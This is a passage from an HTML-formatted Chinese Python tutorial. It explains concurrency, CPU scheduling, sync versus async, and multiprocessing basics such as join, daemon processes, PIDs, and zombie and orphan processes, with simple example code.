    print(<span class="hljs-string">&apos;33333333&apos;</span>)
    dic = {<span class="hljs-string">&apos;a&apos;</span>: <span class="hljs-number">1</span>}
    dic[<span class="hljs-string">&apos;aaa&apos;</span>]
<span class="hljs-keyword">finally</span>: <span class="hljs-comment"># &#x4E0D;&#x5904;&#x7406;&#x5F02;&#x5E38;&#xFF0C;&#x65E0;&#x8BBA;&#x662F;&#x5426;&#x53D1;&#x751F;&#x5F02;&#x5E38;&#x90FD;&#x4F1A;&#x6267;&#x884C;finally&#x7684;&#x5B50;&#x4EE3;&#x7801;</span>
    print(<span class="hljs-string">&apos;====&#x300B;&#x300B;&#x300B;&#x300B;&#x300B;&#x5E94;&#x8BE5;&#x628A;&#x88AB;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x4E2D;&#x56DE;&#x6536;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4EE3;&#x7801;&#x653E;&#x5230;&#x8FD9;&#x91CC;&apos;</span>)

print(<span class="hljs-string">&apos;end....&apos;</span>)
</code></pre>
<h4 id="&#x591A;&#x9053;&#x6280;&#x672F;">&#x591A;&#x9053;&#x6280;&#x672F;</h4>
<pre><code>&#x5E76;&#x53D1;&#xFF1A;&#x770B;&#x8D77;&#x6765;&#x50CF;&#x540C;&#x65F6;&#x6267;&#x884C;
&#x5E76;&#x884C;&#xFF1A;&#x5C31;&#x662F;&#x5728;&#x540C;&#x65F6;&#x6267;&#x884C;

~&#x5E76;&#x884C;&#x4E00;&#x5B9A;&#x662F;&#x5E76;&#x53D1;&#xFF0C;&#x4F46;&#x5E76;&#x53D1;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5E76;&#x884C;
~&#x5355;&#x6838;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x80AF;&#x5B9A;&#x4E0D;&#x53EF;&#x80FD;&#x6709;&#x5E76;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5E76;&#x53D1;

&#x628A;&#x6587;&#x4EF6;&#x4ECE;&#x786C;&#x76D8;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#xFF0C;&#x7136;&#x540E;CPU&#x6267;&#x884C;&#x5185;&#x5B58;&#x4E2D;&#x4EE3;&#x7801;

&#x65F6;&#x95F4;&#x590D;&#x7528; + &#x7A7A;&#x95F4;&#x590D;&#x7528;
</code></pre><pre><code>&quot;&quot;&quot;
&#x5207;&#x6362;(CPU)&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x60C5;&#x51B5;
    1.&#x5F53;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x9047;&#x5230;IO&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4F1A;&#x5265;&#x593A;&#x8BE5;&#x7A0B;&#x5E8F;&#x7684;CPU&#x6267;&#x884C;&#x6743;&#x9650;
        &#x4F5C;&#x7528;:&#x63D0;&#x9AD8;&#x4E86;CPU&#x7684;&#x5229;&#x7528;&#x7387; &#x5E76;&#x4E14;&#x4E5F;&#x4E0D;&#x5F71;&#x54CD;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x6548;&#x7387;

    2.&#x5F53;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x957F;&#x65F6;&#x95F4;&#x5360;&#x7528;CPU&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x64CD;&#x4F5C;&#x5438;&#x5F15;&#x4E5F;&#x4F1A;&#x5265;&#x593A;&#x8BE5;&#x7A0B;&#x5E8F;&#x7684;CPU&#x6267;&#x884C;&#x6743;&#x9650;
        &#x5F0A;&#x7AEF;:&#x964D;&#x4F4E;&#x4E86;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x6548;&#x7387;(&#x539F;&#x672C;&#x65F6;&#x95F4;+&#x5207;&#x6362;&#x65F6;&#x95F4;)
&quot;&quot;&quot;
</code></pre><ul>
<li><p>&#x5148;&#x6765;&#x5148;&#x670D;&#x52A1;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;&#x5BF9;&#x957F;&#x4F5C;&#x4E1A;&#x6709;&#x5229;&#xFF0C;&#x5BF9;&#x77ED;&#x4F5C;&#x4E1A;&#x65E0;&#x76CA;&quot;&quot;&quot;</span>
</code></pre>
</li>
<li><p>&#x77ED;&#x4F5C;&#x4E1A;&#x4F18;&#x5148;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;&#x5BF9;&#x77ED;&#x4F5C;&#x4E1A;&#x6709;&#x5229;&#xFF0C;&#x591A;&#x957F;&#x4F5C;&#x4E1A;&#x65E0;&#x76CA;&quot;&quot;&quot;</span>
</code></pre>
</li>
<li><p>&#x65F6;&#x95F4;&#x7247;&#x8F6E;&#x8F6C;&#x6CD5;+&#x591A;&#x7EA7;&#x53CD;&#x9988;&#x961F;&#x5217;</p>
<p>~~~
&#x65F6;&#x95F4;&#x7247;&#x8F6E;&#x8F6C;(Round Robin&#xFF0C;RR)&#x6CD5;&#x7684;&#x57FA;&#x672C;&#x601D;&#x8DEF;&#x662F;&#x8BA9;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x5728;&#x5C31;&#x7EEA;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x4E0E;&#x4EAB;&#x53D7;&#x670D;&#x52A1;&#x7684;&#x65F6;&#x95F4;&#x6210;&#x6BD4;&#x4F8B;&#x3002;&#x5728;&#x65F6;&#x95F4;&#x7247;&#x8F6E;&#x8F6C;&#x6CD5;&#x4E2D;&#xFF0C;&#x9700;&#x8981;&#x5C06;CPU&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x5206;&#x6210;&#x56FA;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x95F4;&#x7247;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x51E0;&#x5341;&#x6BEB;&#x79D2;&#x81F3;&#x51E0;&#x767E;&#x6BEB;&#x79D2;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5728;&#x88AB;&#x8C03;&#x5EA6;&#x9009;&#x4E2D;&#x4E4B;&#x540E;&#x7528;&#x5B8C;&#x4E86;&#x7CFB;&#x7EDF;&#x89C4;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x7247;&#xFF0C;&#x4F46;&#x53C8;&#x672A;&#x5B8C;&#x6210;&#x8981;&#x6C42;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x5219;&#x5B83;&#x81EA;&#x884C;&#x91CA;&#x653E;&#x81EA;&#x5DF1;&#x6240;&#x5360;&#x6709;&#x7684;CPU&#x800C;&#x6392;&#x5230;&#x5C31;&#x7EEA;&#x961F;&#x5217;&#x7684;&#x672B;&#x5C3E;&#xFF0C;&#x7B49;&#x5F85;&#x4E0B;&#x4E00;&#x6B21;&#x8C03;&#x5EA6;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x8FDB;&#x7A0B;&#x8C03;&#x5EA6;&#x7A0B;&#x5E8F;&#x53C8;&#x53BB;&#x8C03;&#x5EA6;&#x5F53;&#x524D;&#x5C31;&#x7EEA;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;</p>
</li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2022/09/13/3f5cea165333edc3.png" alt=""></p>
<p><img src="https://s3.bmp.ovh/imgs/2022/09/13/c33032801c6b5adc.jpg" alt=""></p>
<h4 id="&#x4E24;&#x5BF9;&#x91CD;&#x8981;&#x6982;&#x5FF5;">&#x4E24;&#x5BF9;&#x91CD;&#x8981;&#x6982;&#x5FF5;</h4>
<ul>
<li><p><strong>&#x540C;&#x6B65;&#x548C;&#x5F02;&#x6B65;</strong></p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;&#x63CF;&#x8FF0;&#x7684;&#x662F;&#x4EFB;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x65B9;&#x5F0F;&quot;&quot;&quot;</span>
&#x540C;&#x6B65;:&#x4EFB;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;&#x539F;&#x5730;&#x7B49;&#x5F85;&#x4EFB;&#x52A1;&#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x7B49;&#x5F85;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x4E8B;(&#x5E72;&#x7B49;)
      &#x7A0B;&#x5E8F;&#x5C42;&#x9762;&#x4E0A;&#x8868;&#x73B0;&#x51FA;&#x6765;&#x7684;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x5361;&#x4F4F;&#x4E86;

&#x5F02;&#x6B65;:&#x4EFB;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x539F;&#x5730;&#x7B49;&#x5F85;&#x4EFB;&#x52A1;&#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x76F4;&#x63A5;&#x53BB;&#x505A;&#x5176;&#x4ED6;&#x4E8B;&#x60C5;
      &#x6211;&#x63D0;&#x4EA4;&#x7684;&#x4EFB;&#x52A1;&#x7ED3;&#x679C;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#xFF1F;
    &#x4EFB;&#x52A1;&#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x5F02;&#x6B65;&#x56DE;&#x8C03;&#x673A;&#x5236;&#x81EA;&#x52A8;&#x5904;&#x7406;
</code></pre>
</li>
</ul>
<p>&#x200B;    <img src="https://s3.bmp.ovh/imgs/2022/09/13/f3e7cea0b4757e34.png" alt="&#x540C;&#x6B65;"></p>
<ul>
<li><p><strong>&#x963B;&#x585E;&#x975E;&#x963B;&#x585E;</strong></p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;&#x63CF;&#x8FF0;&#x7684;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&quot;&quot;&quot;</span>
&#x963B;&#x585E;:&#x963B;&#x585E;&#x6001;
&#x975E;&#x963B;&#x585E;:&#x5C31;&#x7EEA;&#x6001;&#x3001;&#x8FD0;&#x884C;&#x6001;

&#x7406;&#x60F3;&#x72B6;&#x6001;:&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x8BA9;&#x6211;&#x4EEC;&#x7684;&#x5199;&#x7684;&#x4EE3;&#x7801;&#x6C38;&#x8FDC;&#x5904;&#x4E8E;&#x5C31;&#x7EEA;&#x6001;&#x548C;&#x8FD0;&#x884C;&#x6001;&#x4E4B;&#x95F4;&#x5207;&#x6362;
</code></pre>
</li>
</ul>
<p>&#x4E0A;&#x8FF0;&#x6982;&#x5FF5;&#x7684;&#x7EC4;&#x5408;:&#x6700;&#x9AD8;&#x6548;&#x7684;&#x4E00;&#x79CD;&#x7EC4;&#x5408;&#x5C31;&#x662F;<strong>&#x5F02;&#x6B65;&#x975E;&#x963B;&#x585E;</strong></p>
<h4 id="&#x5F00;&#x542F;&#x8FDB;&#x7A0B;&#x7684;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x5F02;&#x6B65;">&#x5F00;&#x542F;&#x8FDB;&#x7A0B;&#x7684;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;(&#x5F02;&#x6B65;)</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x7B2C;&#x4E00;&#x79CD;</span>
<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
<span class="hljs-keyword">import</span> time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">(name)</span>:</span>
    print(<span class="hljs-string">&apos;%s is running&apos;</span>%name)
    time.sleep(<span class="hljs-number">3</span>)
    print(<span class="hljs-string">&apos;%s is over&apos;</span>%name)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-comment"># 1 &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;</span>
    p = Process(target=task, args=(<span class="hljs-string">&apos;jason&apos;</span>,))
    <span class="hljs-comment"># &#x5BB9;&#x5668;&#x7C7B;&#x578B;&#x54EA;&#x6015;&#x91CC;&#x9762;&#x53EA;&#x6709;1&#x4E2A;&#x5143;&#x7D20; &#x5EFA;&#x8BAE;&#x8981;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;</span>
    <span class="hljs-comment"># 2 &#x5F00;&#x542F;&#x8FDB;&#x7A0B;</span>
    p.start()  <span class="hljs-comment"># &#x544A;&#x8BC9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;  &#x5F02;&#x6B65;</span>
    print(<span class="hljs-string">&apos;&#x4E3B;&apos;</span>)
<span class="hljs-string">&quot;&quot;&quot;
windows&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E0B; &#x521B;&#x5EFA;&#x8FDB;&#x7A0B;&#x4E00;&#x5B9A;&#x8981;&#x5728;main&#x5185;&#x521B;&#x5EFA;
&#x56E0;&#x4E3A;windows&#x4E0B;&#x521B;&#x5EFA;&#x8FDB;&#x7A0B;&#x7C7B;&#x4F3C;&#x4E8E;&#x6A21;&#x5757;&#x5BFC;&#x5165;&#x7684;&#x65B9;&#x5F0F;
&#x4F1A;&#x4ECE;&#x4E0A;&#x5F80;&#x4E0B;&#x4F9D;&#x6B21;&#x6267;&#x884C;&#x4EE3;&#x7801;
linux&#x4E2D;&#x5219;&#x662F;&#x76F4;&#x63A5;&#x5C06;&#x4EE3;&#x7801;&#x5B8C;&#x6574;&#x7684;&#x62F7;&#x8D1D;&#x4E00;&#x4EFD;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x5F0F; &#x7C7B;&#x7684;&#x7EE7;&#x627F;</span>
<span class="hljs-comment"># from multiprocessing import Process</span>
<span class="hljs-comment"># import time</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># class MyProcess(Process):</span>
<span class="hljs-comment">#     def run(self):</span>
<span class="hljs-comment">#         print(&apos;hello bf girl&apos;)</span>
<span class="hljs-comment">#         time.sleep(1)</span>
<span class="hljs-comment">#         print(&apos;get out!&apos;)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># if __name__ == &apos;__main__&apos;:</span>
<span class="hljs-comment">#     p = MyProcess()</span>
<span class="hljs-comment">#     p.start()</span>
<span class="hljs-comment">#     print(&apos;&#x4E3B;&apos;)</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x521B;&#x5EFA;&#x8FDB;&#x7A0B;&#x5C31;&#x662F;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7533;&#x8BF7;&#x4E00;&#x5757;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x5C06;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x4E22;&#x8FDB;&#x53BB;
&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5BF9;&#x5E94;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5C31;&#x662F;&#x4E00;&#x5757;&#x72EC;&#x7ACB;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;
&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x5BF9;&#x5E94;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5C31;&#x662F;&#x591A;&#x5757;&#x72EC;&#x7ACB;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;
&#x8FDB;&#x7A0B;&#x4E0E;&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x6570;&#x636E;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x4EA4;&#x4E92;,&#x5982;&#x679C;&#x60F3;&#x4EA4;&#x4E92;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x4E8E;&#x7B2C;&#x4E09;&#x65B9;&#x5DE5;&#x5177;&#x3001;&#x6A21;&#x5757;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="join&#x65B9;&#x6CD5;">join&#x65B9;&#x6CD5;</h4>
<p>join&#x662F;&#x8BA9;&#x4E3B;&#x8FDB;&#x7A0B;&#x7B49;&#x5F85;&#x5B50;&#x8FDB;&#x7A0B;&#x4EE3;&#x7801;&#x8FD0;&#x884C;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;&#x4E0D;&#x5F71;&#x54CD;&#x5176;&#x4ED6;&#x5B50;&#x8FDB;&#x7A0B;&#x7684;&#x6267;&#x884C;</p>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
<span class="hljs-keyword">import</span> time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">(name, n)</span>:</span>
    print(<span class="hljs-string">&apos;%s is running&apos;</span>%name)
    time.sleep(n)
    print(<span class="hljs-string">&apos;%s is over&apos;</span>%name)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-comment"># p1 = Process(target=task, args=(&apos;jason&apos;, 1))</span>
    <span class="hljs-comment"># p2 = Process(target=task, args=(&apos;egon&apos;, 2))</span>
    <span class="hljs-comment"># p3 = Process(target=task, args=(&apos;tank&apos;, 3))</span>
    <span class="hljs-comment"># start_time = time.time()</span>
    <span class="hljs-comment"># p1.start()</span>
    <span class="hljs-comment"># p2.start()</span>
    <span class="hljs-comment"># p3.start()  # &#x4EC5;&#x4EC5;&#x662F;&#x544A;&#x8BC9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8981;&#x521B;&#x5EFA;&#x8FDB;&#x7A0B;</span>
    <span class="hljs-comment"># # time.sleep(50000000000000000000)</span>
    <span class="hljs-comment"># # p.join()  # &#x4E3B;&#x8FDB;&#x7A0B;&#x7B49;&#x5F85;&#x5B50;&#x8FDB;&#x7A0B;p&#x8FD0;&#x884C;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x518D;&#x7EE7;&#x7EED;&#x5F80;&#x540E;&#x6267;&#x884C;</span>
    <span class="hljs-comment"># p1.join()</span>
    <span class="hljs-comment"># p2.join()</span>
    <span class="hljs-comment"># p3.join()</span>
    start_time = time.time()
    p_list = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>):
        p = Process(target=task, args=(<span class="hljs-string">&apos;&#x5B50;&#x8FDB;&#x7A0B;%s&apos;</span>%i, i))
        p.start()
        p_list.append(p)
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:
        p.join()
    print(<span class="hljs-string">&apos;&#x4E3B;&apos;</span>, time.time() - start_time)
</code></pre>
<h2 id=""> </h2>
<h4 id="&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x6570;&#x636E;&#x76F8;&#x4E92;&#x9694;&#x79BB;">&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x6570;&#x636E;&#x76F8;&#x4E92;&#x9694;&#x79BB;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process


money = <span class="hljs-number">100</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> money  <span class="hljs-comment"># &#x5C40;&#x90E8;&#x4FEE;&#x6539;&#x5168;&#x5C40;</span>
    money = <span class="hljs-number">666</span>
    print(<span class="hljs-string">&apos;&#x5B50;&apos;</span>,money)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    p = Process(target=task)
    p.start()
    p.join()
    print(money)
</code></pre>
<h4 id="&#x8FDB;&#x7A0B;&#x5BF9;&#x8C61;&#x53CA;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;">&#x8FDB;&#x7A0B;&#x5BF9;&#x8C61;&#x53CA;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x4E00;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x9762;&#x8FD0;&#x884C;&#x7740;&#x5F88;&#x591A;&#x8FDB;&#x7A0B;&#xFF0C;&#x90A3;&#x4E48;&#x8BA1;&#x7B97;&#x673A;&#x662F;&#x5982;&#x4F55;&#x533A;&#x5206;&#x5E76;&#x7BA1;&#x7406;&#x8FD9;&#x4E9B;&#x8FDB;&#x7A0B;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x5462;&#xFF1F;
&#x8BA1;&#x7B97;&#x673A;&#x4F1A;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x5206;&#x914D;&#x4E00;&#x4E2A;PID&#x53F7; 
&#x5982;&#x4F55;&#x67E5;&#x770B;
    windows&#x7535;&#x8111; 
        &#x8FDB;&#x5165;cmd&#x8F93;&#x5165;tasklist&#x5373;&#x53EF;&#x67E5;&#x770B;
        tasklist |findstr PID&#x67E5;&#x770B;&#x5177;&#x4F53;&#x7684;&#x8FDB;&#x7A0B;
    mac&#x7535;&#x8111; 
        &#x8FDB;&#x5165;&#x7EC8;&#x7AEF;&#x4E4B;&#x540E;&#x8F93;&#x5165;ps aux
        ps aux|grep PID&#x67E5;&#x770B;&#x5177;&#x4F53;&#x7684;&#x8FDB;&#x7A0B; 
&quot;&quot;&quot;</span>
<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, current_process
current_process().pid  <span class="hljs-comment"># &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x7684;&#x8FDB;&#x7A0B;&#x53F7;</span>

<span class="hljs-keyword">import</span> os
os.getpid()  <span class="hljs-comment"># &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x8FDB;&#x7A0B;&#x53F7;</span>
os.getppid()  <span class="hljs-comment"># &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x7684;&#x7236;&#x8FDB;&#x7A0B;&#x8FDB;&#x7A0B;&#x53F7;</span>


p.terminate()  <span class="hljs-comment"># &#x6740;&#x6B7B;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;</span>
<span class="hljs-comment"># &#x662F;&#x544A;&#x8BC9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5E2E;&#x4F60;&#x53BB;&#x6740;&#x6B7B;&#x5F53;&#x524D;&#x8FDB;&#x7A0B; &#x4F46;&#x662F;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4; &#x800C;&#x4EE3;&#x7801;&#x7684;&#x8FD0;&#x884C;&#x901F;&#x5EA6;&#x6781;&#x5FEB;</span>
time.sleep(<span class="hljs-number">0.1</span>)
print(p.is_alive())  <span class="hljs-comment"># &#x5224;&#x65AD;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x662F;&#x5426;&#x5B58;&#x6D3B;</span>
</code></pre>
<h4 id="&#x50F5;&#x5C38;&#x8FDB;&#x7A0B;&#x4E0E;&#x5B64;&#x513F;&#x8FDB;&#x7A0B;">&#x50F5;&#x5C38;&#x8FDB;&#x7A0B;&#x4E0E;&#x5B64;&#x513F;&#x8FDB;&#x7A0B;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x50F5;&#x5C38;&#x8FDB;&#x7A0B;</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x6B7B;&#x4E86;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x6B7B;&#x900F;
&#x5F53;&#x4F60;&#x5F00;&#x8BBE;&#x4E86;&#x5B50;&#x8FDB;&#x7A0B;&#x4E4B;&#x540E; &#x8BE5;&#x8FDB;&#x7A0B;&#x6B7B;&#x540E;&#x4E0D;&#x4F1A;&#x7ACB;&#x523B;&#x91CA;&#x653E;&#x5360;&#x7528;&#x7684;&#x8FDB;&#x7A0B;&#x53F7;
&#x56E0;&#x4E3A;&#x6211;&#x8981;&#x8BA9;&#x7236;&#x8FDB;&#x7A0B;&#x80FD;&#x591F;&#x67E5;&#x770B;&#x5230;&#x5B83;&#x5F00;&#x8BBE;&#x7684;&#x5B50;&#x8FDB;&#x7A0B;&#x7684;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x4FE1;&#x606F; &#x5360;&#x7528;&#x7684;pid&#x53F7; &#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x3002;&#x3002;&#x3002;
&#x6240;&#x6709;&#x7684;&#x8FDB;&#x7A0B;&#x90FD;&#x4F1A;&#x6B65;&#x5165;&#x50F5;&#x5C38;&#x8FDB;&#x7A0B;
    &#x7236;&#x8FDB;&#x7A0B;&#x4E0D;&#x6B7B;&#x5E76;&#x4E14;&#x5728;&#x65E0;&#x9650;&#x5236;&#x7684;&#x521B;&#x5EFA;&#x5B50;&#x8FDB;&#x7A0B;&#x5E76;&#x4E14;&#x5B50;&#x8FDB;&#x7A0B;&#x4E5F;&#x4E0D;&#x7ED3;&#x675F;
    &#x56DE;&#x6536;&#x5B50;&#x8FDB;&#x7A0B;&#x5360;&#x7528;&#x7684;pid&#x53F7;
        &#x7236;&#x8FDB;&#x7A0B;&#x7B49;&#x5F85;&#x5B50;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7ED3;&#x675F;
        &#x7236;&#x8FDB;&#x7A0B;&#x8C03;&#x7528;join&#x65B9;&#x6CD5;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x5B64;&#x513F;&#x8FDB;&#x7A0B;</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x5B50;&#x8FDB;&#x7A0B;&#x5B58;&#x6D3B;&#xFF0C;&#x7236;&#x8FDB;&#x7A0B;&#x610F;&#x5916;&#x6B7B;&#x4EA1;
&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4F1A;&#x5F00;&#x8BBE;&#x4E00;&#x4E2A;&#x201C;&#x513F;&#x7AE5;&#x798F;&#x5229;&#x9662;&#x201D;&#x4E13;&#x95E8;&#x7BA1;&#x7406;&#x5B64;&#x513F;&#x8FDB;&#x7A0B;&#x56DE;&#x6536;&#x76F8;&#x5173;&#x8D44;&#x6E90;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;">&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</h4>
<pre><code class="lang-PYTHON"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
<span class="hljs-keyword">import</span> time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">(name)</span>:</span>
    print(<span class="hljs-string">&apos;%s&#x603B;&#x7BA1;&#x6B63;&#x5728;&#x6D3B;&#x7740;&apos;</span>% name)
    time.sleep(<span class="hljs-number">3</span>)
    print(<span class="hljs-string">&apos;%s&#x603B;&#x7BA1;&#x6B63;&#x5728;&#x6B7B;&#x4EA1;&apos;</span> % name)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    p = Process(target=task,args=(<span class="hljs-string">&apos;egon&apos;</span>,))
    <span class="hljs-comment"># p = Process(target=task,kwargs={&apos;name&apos;:&apos;egon&apos;})</span>
    p.daemon = <span class="hljs-keyword">True</span>  <span class="hljs-comment"># &#x5C06;&#x8FDB;&#x7A0B;p&#x8BBE;&#x7F6E;&#x6210;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;  &#x8FD9;&#x4E00;&#x53E5;&#x4E00;&#x5B9A;&#x8981;&#x653E;&#x5728;start&#x65B9;&#x6CD5;&#x4E0A;&#x9762;&#x624D;&#x6709;&#x6548;&#x5426;&#x5219;&#x4F1A;&#x76F4;&#x63A5;&#x62A5;&#x9519;</span>
    p.start()
    print(<span class="hljs-string">&apos;&#x7687;&#x5E1D;jason&#x5BFF;&#x7EC8;&#x6B63;&#x5BDD;&apos;</span>)
</code></pre>
<h4 id="&#x4E92;&#x65A5;&#x9501;">&#x4E92;&#x65A5;&#x9501;</h4>
<p>&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x64CD;&#x4F5C;&#x540C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x9519;&#x4E71;&#x7684;&#x95EE;&#x9898;</p>
